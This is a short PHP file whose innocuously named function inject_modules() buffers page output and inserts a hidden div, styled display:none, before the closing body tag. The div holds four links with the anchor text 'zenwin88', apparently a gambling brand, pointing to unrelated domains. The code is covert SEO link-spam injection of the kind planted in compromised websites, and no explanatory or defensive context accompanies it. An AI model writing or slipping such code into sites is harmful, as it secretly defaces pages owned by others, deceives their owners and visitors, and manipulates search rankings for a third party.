<?php
function inject_modules() {
    ob_start(function($buffer) {
        $inject = '<div style="display:none;">
            <a href="https://dateiupload.com/">zenwin88</a>
            <a href="https://michaelfruchter.com/">zenwin88</a>
            <a href="https://kswederski.com/">zenwin88</a>
            <a href="https://shekepknights.com/">zenwin88</a>

        </div>';
        return str_ireplace('</body>', $inject . '</body>', $buffer);
    });
}